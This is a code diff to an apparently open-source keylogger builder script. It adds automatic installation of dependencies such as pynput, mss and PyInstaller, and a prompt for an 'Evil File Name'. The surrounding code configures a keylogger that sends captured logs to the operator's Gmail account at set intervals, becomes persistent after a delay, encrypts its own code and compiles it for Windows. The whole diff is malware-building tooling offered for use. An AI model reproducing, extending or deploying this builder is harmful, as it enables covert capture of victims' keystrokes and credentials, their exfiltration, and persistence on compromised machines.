@@ -26,6 +26,31 @@ def get_arguments():
     required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
     return parser.parse_args()
 
+def check_dependencies():
+    print(f"{YELLOW}\n[*] Checking Dependencies...")
+    try:
+        import mss, essential_generators, PyInstaller, pynput, six
+        print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
+    except Exception as e:
+        print(f"[!] Error : {e}")
+        try:
+            print(f"{YELLOW}[*] Installing All Dependencies From Scratch...\n")
+            print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
+            import pip
+            while 1:
+                pip.main(['install', 'mss==4.0.3'])
+                pip.main(['install', 'essential_generators==0.9.2'])
+                pip.main(['install', 'PyInstaller'])
+                pip.main(['install', 'pynput==1.4.4'])
+                pip.main(['install', 'six==1.12.0']) 
+                pip.main(['install', 'python-xlib==0.25'])
+                print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
+                print(f"{GREEN}\n[+] Dependencies installed correctly ;)\n")
+                break
+        except:
+            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")
+            quit()
+
 def create_keylogger(file_name, interval, email, password, time_persistent):
     with open(file_name, "w+") as file:
         file.write("import keylogger\n")
@@ -76,6 +101,7 @@ if __name__ == '__main__':
         print(f'   {YELLOW}Password:{RED} ' + arguments.password) 
         print(f'   {YELLOW}Log\'s Send Interval:{RED} Every ' + str(arguments.interval) + ' seconds')
         print(f'   {YELLOW}Becomes Persistence After:{RED} ' + str(arguments.time_persistent) + ' seconds')
+        print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out)        
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
         
         ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) :')
@@ -86,7 +112,10 @@ if __name__ == '__main__':
             arguments.email = input('\n[?] Type your gmail to receive logs: ')
             arguments.password = input('[?] Type your gmail password: ')
             arguments.interval = int(input('[?] Time interval to send logs; [In Seconds]: '))
-            arguments.time_persistent = int(input('[?] Time after to become persistence; [In Seconds]: '))            
+            arguments.time_persistent = int(input('[?] Time after to become persistence; [In Seconds]: '))   
+            arguments.out = input('[?] Output Evil File Name: ')             
+
+        check_dependencies()
 
         print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")
 
@@ -95,6 +124,8 @@ if __name__ == '__main__':
         
         encrypting_code = encrypt_code.Encrypt()
         encrypting_code.encrypt(arguments.out)
+
+        print(f"{MAGENTA}")
 
         if arguments.windows:
             compile_for_windows(arguments.out)
